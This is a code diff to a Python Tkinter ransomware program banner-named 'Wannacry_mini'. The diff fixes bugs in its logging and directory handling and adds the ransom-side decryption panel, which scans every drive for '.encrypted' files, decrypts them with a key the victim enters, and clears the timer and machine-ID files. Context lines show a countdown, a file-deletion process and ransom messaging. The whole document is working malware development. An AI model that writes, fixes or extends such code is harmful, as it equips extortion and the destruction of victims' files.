@@ -17,7 +17,7 @@ def resource_path(relative_path):
 
 def time_dir_exists():
     if not os.path.exists(TIME_DIR):
-        os.mkdirs(TIME_DIR)
+        os.makedirs(TIME_DIR, exist_ok=True)
 
 def load_machine_id():
     drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
@@ -57,7 +57,7 @@ MAX_ATTEMPTS = 10
 DELAY = 5
 
 logging.basicConfig(
-    filemode='encryption_log.txt',
+    filename='encryption_log.txt',
     level=logging.INFO,
     format='%(asctime)s:%(levelname)s:%(message)s',
     filemode='w'
@@ -234,7 +234,7 @@ class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
         position_down = int(screen_height/2 - window_height/2)
         self.geometry(f"+{position_right}+{position_down}")
 
-class CountdownDIalog(tk.Toplevel):
+class CountdownDialog(tk.Toplevel):
     def __init__(self, parent, countdown_time, close_app_callback):
         super().__init__(parent)
         self.countdown_time = countdown_time
@@ -429,3 +429,118 @@ He will try whatever to restore your files.
             self.stop_deletion_process()
         else:
             messagebox.showerror("Error", "Incorrect secondary termination key.")
+
+    def log(self, message, color='green'):
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        formatted_message = f"[{timestamp}] [{message}]"
+        if self.winfo_exists():
+            self.after(0, lambda: self._update_log_listbox(formatted_message, color))
+
+    def _update_log_listbox(self, message, color):
+        self.log_listbox.insert(tk.END, message)
+        self.log_listbox.itemconfig(tk.END, {'fg': color})
+        self.log_listbox.see(tk.END)
+    
+    def setup_key_frame(self):
+        key_frame = tk.Frame(self, bg='black')
+        key_frame.pack(fill=tk.X, padx=10, pady=(10,5))
+        self.key_entry = tk.Entry(key_frame, fg='black', font=('Helvetica', 12), bd=1, relief=tk.FLAT)
+        self.key_entry.pack(fill=tk.X, side=tk.LEFT, expand=True, padx=(10,0), ipady=8)
+        tk.Button(key_frame, text="START DECRYPTION", bg='#d9534f', fg='white', font=('Helvetica', 12),
+                  relief=tk.FLAT, command=self.start_decryption).pack(side=tk.RIGHT, padx=(10,0))
+    
+    def setup_log_frame(self):
+        log_frame = tk.Frame(self, bg='black')
+        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        banner_text = "Welcome to Wannacry_mini T_T - [CAT MODE]"
+        banner_label = tk.Label(log_frame, text=banner_text, fg='orange', bg='black', font=('Courier New', 12))
+        banner_label.pack(side=tk.TOP, fill=tk.X)
+
+        self.log_listbox = tk.Listbox(log_frame, height=6, width=50, bg='black', fg='#00FF00', font=('Courier New', 10))
+        self.log_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+
+        scrollbar = tk.Scrollbar(log_frame, orient="vertical", command=self.log_listbox.yview)
+        scrollbar.pack(side="right", fill="y")
+        self.log_listbox.config(yscrollcommand=scrollbar.set)
+
+    def setup_progress_frame(self):
+        self.progress_frame = tk.Frame(self, bg='black')
+        self.progress_frame.pack(fill=tk.X, padx=10, pady=20)
+        style = ttk.Style()
+        style.theme_use('clam')
+        style.configure("Enhanced.Horizontal.TProgressbar", troughcolor='black', background='green', thickness=20)
+        self.progress = ttk.Progressbar(self.progress_frame, style="Enhanced.Horizontal.TProgressbar",
+                                        orient=tk.HORIZONTAL, length=400, mode='determinate')
+        self.progress.pack(fill=tk.X, expand=True)
+        self.progress_label = tk.Label(self.progress_frame, text="Decryption Progress: 0%", bg='black', fg='white')
+        self.progress_label.pack()
+
+    def start_decryption(self):
+        decryption_key = self.key_entry.get()
+        if decryption_key:
+            try:
+                key = base64.b64decode(decryption_key)
+                self.log("Starting scan and decryption")
+                if self.timer_update_id:
+                    self.after_cancel(self.timer_update_id)
+                    self.timer_update_id = None
+                threading.Thread(target=self.scan_and_decrypt, args=(key,), daemon=True).start()
+            except base64.binascii.Error:
+                messagebox.showerror("Error", "Invalid decryption key. Please check the key and try again.")
+        else: 
+            messagebox.showerror("Error", "Decryption key is not provided")
+    
+    def scan_and_decrypt(self, key):
+        encrypted_files = []
+        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
+
+        for drive in drives:
+            self.log(f"scanning drive {drive} for encrypted files")
+            for dp, dn, filenames in os.walk(drive):
+                if any(excluded in dp for excluded in {'System Volume Information', '$RECYCLE.BIN', 'Windows'}):
+                    continue
+
+                for f in filenames:
+                    if f.endswith('.encrypted'):
+                        encrypted_files.append(os.path.join(dp, f))
+                        self.log(f"Found encrypted file {os.path.join(dp, f)}")
+            
+            total_files = len(encrypted_files)
+            self.safe_update_progress(0, total_files)
+            decrypted_count = 0
+            for file_path in encrypted_files:
+                if self.decrypt_file(file_path, key):
+                    decrypted_count += 1
+                    self.safe_update_progress(decrypted_count, total_files)
+            
+            if decrypted_count == total_files:
+                self.after(0, self.stop_timer_and_show_success)
+            else:
+                self.after(0, lambda: messagebox.showerror("Decryption Failed",
+                                                           "Failed to decrypt one or more files. please check the decryption key and try again"))
+    
+    def show_incomplete_message(self, decrypted_count, total_count):
+        messagebox.showwarning("Decryption Incomplete", f"Decryption completed for {decrypted_count} out of {total_count} files") 
+
+    def safe_update_progress(self, value, maximum):
+        self.after(0, lambda: self.update_progress_bar(value, maximum))
+
+    def update_progress_bar(self, value, maximum):
+        self.progress["value"] = value
+        self.progress["maximum"] = maximum
+        percentage = 100 * (value / maximum) if maximum else 0
+        self.progress_label.config(text=f"Decryption Progress: {percentage:.2f}")
+
+    def stop_timer_and_show_success(self):
+        if self.timer_update_id:
+            self.after_cancel(self.timer_update_id)
+            self.timer_update_id = None
+        
+        success_message = "All files decrypted successfully. Thank you for your patience."
+        messagebox.showinfo("Decryption Complete", success_message, parent=self)
+
+        self.delete_timer_and_machine_id_files()
+        self.delete_timer_state_file()
+        countdown_dialog = CountdownDialog(self, 10, self.close_application)
+        countdown_dialog.mainloop()
